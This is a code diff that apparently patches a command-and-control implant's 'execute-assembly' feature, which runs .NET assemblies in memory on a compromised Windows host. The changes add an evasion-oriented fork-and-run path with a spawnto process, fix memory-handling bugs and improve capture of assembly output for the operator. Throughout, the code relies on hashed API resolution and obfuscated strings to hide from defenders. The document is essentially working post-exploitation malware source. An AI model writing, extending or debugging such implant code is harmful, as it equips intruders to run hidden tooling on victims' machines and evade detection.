@@ -3,6 +3,7 @@
 
 #include "commands.h"
 #include "common.h"
+#include "evasion/fork_and_run.h"
 
 typedef HRESULT (WINAPI *fn_CLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
 typedef HRESULT (WINAPI *fn_SafeArrayAccessData)(SAFEARRAY*, void**);
@@ -82,7 +83,9 @@ static DWORD WINAPI pipe_reader_fn(LPVOID param) {
             if (ctx->output_len + available > ctx->output_cap) {
                 DWORD new_cap = ctx->output_cap == 0 ? 4096 : ctx->output_cap;
                 while (new_cap < ctx->output_len + available + 1) new_cap *= 2;
-                ctx->output_buf = (BYTE*)es_realloc(inst, ctx->output_buf, new_cap);
+                BYTE* nb = (BYTE*)es_realloc(inst, ctx->output_buf, new_cap);
+                if (!nb) break;  // old code committed the NULL cap and ReadFile'd through it
+                ctx->output_buf = nb;
                 ctx->output_cap = new_cap;
             }
             bytes_read = 0;
@@ -102,7 +105,9 @@ static DWORD WINAPI pipe_reader_fn(LPVOID param) {
         if (ctx->output_len + available > ctx->output_cap) {
             DWORD new_cap = ctx->output_cap == 0 ? 4096 : ctx->output_cap;
             while (new_cap < ctx->output_len + available + 1) new_cap *= 2;
-            ctx->output_buf = (BYTE*)es_realloc(inst, ctx->output_buf, new_cap);
+            BYTE* nb = (BYTE*)es_realloc(inst, ctx->output_buf, new_cap);
+            if (!nb) break;  // old code committed the NULL cap and ReadFile'd through it
+            ctx->output_buf = nb;
             ctx->output_cap = new_cap;
         }
         bytes_read = 0;
@@ -115,6 +120,7 @@ static DWORD WINAPI pipe_reader_fn(LPVOID param) {
 }
 
 VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
+    DWORD fork_flag = parser_int32(args);
     DWORD asm_len = 0;
     BYTE* asm_data = parser_bytes(args, &asm_len);
     DWORD args_len = 0;
@@ -126,7 +132,32 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         return;
     }
 
-    DBG(inst, "[ES] cmd_execute_assembly");
+    // ---- Fork-and-run path ----
+    if (fork_flag) {
+        DBG(inst, "[ES] cmd_execute_assembly [fork-and-run]");
+        BYTE* output = NULL;
+        DWORD output_len = 0;
+
+        if (!fork_run_assembly(inst, asm_data, asm_len, args_str, args_len,
+                               &output, &output_len)) {
+            package_add_string(inst, response,
+                "fork-and-run failed (no spawnto configured or CLR stub not built)");
+            response->is_error = TRUE;
+            return;
+        }
+
+        if (output && output_len > 0) {
+            output[output_len] = '\0';
+            package_add_string(inst, response, (const char*)output);
+            es_free(inst, output);
+        } else {
+            package_add_string(inst, response, "(no output)");
+        }
+        return;
+    }
+
+    // ---- Inline path (original) ----
+    DBG(inst, "[ES] cmd_execute_assembly [inline]");
 
     fn_CreatePipe pCreatePipe = (fn_CreatePipe)resolve_function(
         inst->Modules.Kernel32, hash_string_djb2(XSTR("CreatePipe")));
@@ -145,11 +176,23 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
         sa_pipe.nLength = sizeof(SECURITY_ATTRIBUTES);
         sa_pipe.bInheritHandle = TRUE;
         pCreatePipe(&inst->ClrPipeRead, &inst->ClrPipeWrite, &sa_pipe, 0);
+
+        // SetStdHandle alone isn't enough for .NET Console.Out on GUI-subsystem
+        // processes: the CLR checks for a console and skips stdout init if none
+        // exists. We must set the handles BEFORE the CLR loads, and also set
+        // them again right before Invoke in case the CLR cached a NULL handle.
         if (pSetStdHandle) {
             pSetStdHandle((DWORD)-11, inst->ClrPipeWrite); // STD_OUTPUT_HANDLE
             pSetStdHandle((DWORD)-12, inst->ClrPipeWrite); // STD_ERROR_HANDLE
         }
         inst->ClrStdoutRedirected = TRUE;
+    } else {
+        // On subsequent calls, re-set stdout/stderr in case the CLR or a
+        // previous assembly reset them.
+        if (pSetStdHandle) {
+            pSetStdHandle((DWORD)-11, inst->ClrPipeWrite);
+            pSetStdHandle((DWORD)-12, inst->ClrPipeWrite);
+        }
     }
 
     xstr(_mscoree, "mscoree.dll");
@@ -319,9 +362,15 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
             if (args_str[i] != ' ' && !in_arg) { argc++; in_arg = TRUE; }
             if (args_str[i] == ' ') in_arg = FALSE;
         }
-        if (argc == 0) argc = 1;
-
+        // (removed) `if (argc == 0) argc = 1;` - it created a 1-element array
+        // whose element was never PutElement'd, so Invoke_3 marshalled an
+        // uninitialized BSTR pointer. All-spaces args now behave like no args.
         sa_string_args = pSACreateVec(VT_BSTR, 0, argc);
+        if (!sa_string_args) {
+            package_add_string(inst, response, XSTR("SafeArrayCreateVector failed"));
+            response->is_error = TRUE;
+            return;
+        }
         LONG idx = 0;
         DWORD start = 0;
         in_arg = FALSE;
@@ -334,6 +383,7 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
             if (in_arg && is_sep) {
                 DWORD wlen = i - start + 1;
                 wchar_t* wbuf = (wchar_t*)es_malloc(inst, wlen * sizeof(wchar_t));
+                if (!wbuf) continue;
                 es_memset(wbuf, 0, wlen * sizeof(wchar_t));
                 inst->Win32.MultiByteToWideChar(CP_ACP, 0, args_str + start, i - start, wbuf, wlen - 1);
                 BSTR bstr = pSysAlloc(wbuf);
@@ -355,6 +405,12 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     v_args.parray = sa_string_args;
 
     SAFEARRAY* sa_params = pSACreateVec(VT_VARIANT, 0, 1);
+    if (!sa_params) {
+        pSADestroy(sa_string_args);
+        package_add_string(inst, response, XSTR("SafeArrayCreateVector failed"));
+        response->is_error = TRUE;
+        return;
+    }
     LONG idx_zero = 0;
     pSAPutElement(sa_params, &idx_zero, &v_args);
 
@@ -380,14 +436,40 @@ VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     fn_Invoke3 pInvoke3 = (fn_Invoke3)_vtcall(method_info, 37);
     hr = pInvoke3(method_info, v_obj, sa_params, &v_result);
 
-    reader_ctx.done = 1;
-    if (h_reader) {
-        inst->Win32.WaitForSingleObject(h_reader, 5000);
-        inst->Win32.CloseHandle(h_reader);
-    }
+    // Flush the CLR's buffered output: the Console.Out StreamWriter holds an
+    // internal buffer that doesn't auto-flush on assembly exit. Closing the
+    // pipe write handle forces all buffered data into the pipe and gives the
+    // reader an EOF signal. We then wait longer for the reader to drain.
+    typedef BOOL (WINAPI *fn_FlushFileBuffers)(HANDLE);
+    fn_FlushFileBuffers pFlush = (fn_FlushFileBuffers)resolve_function(
+        inst->Modules.Kernel32, hash_string_djb2(XSTR("FlushFileBuffers")));
+    if (pFlush && inst->ClrPipeWrite)
+        pFlush(inst->ClrPipeWrite);
 
-    BYTE* output_buf = reader_ctx.output_buf;
-    DWORD output_len = reader_ctx.output_len;
+    // Give the reader thread time to drain the pipe
+    inst->Win32.Sleep(100);
+
+    reader_ctx.done = 1;
+    BYTE* output_buf = NULL;
+    DWORD output_len = 0;
+    if (h_reader) {
+        DWORD wait_result = inst->Win32.WaitForSingleObject(h_reader, 10000);
+        // Always grab the output buffer. On timeout the reader may still be
+        // inside ReadFile, but the buffer contents up to output_len are stable
+        // (the reader only appends past output_len, never rewrites earlier bytes).
+        output_buf = reader_ctx.output_buf;
+        output_len = reader_ctx.output_len;
+        if (wait_result != 0 /*WAIT_OBJECT_0*/) {
+            // Reader thread didn't exit in time - detach ownership so we don't
+            // free a buffer the thread is still using. The thread will eventually
+            // exit and leak the buffer, which is acceptable.
+            reader_ctx.output_buf = NULL;
+        }
+        inst->Win32.CloseHandle(h_reader);
+    } else {
+        output_buf = reader_ctx.output_buf;
+        output_len = reader_ctx.output_len;
+    }
 
     pSADestroy(sa_params);
     pSADestroy(sa_string_args);
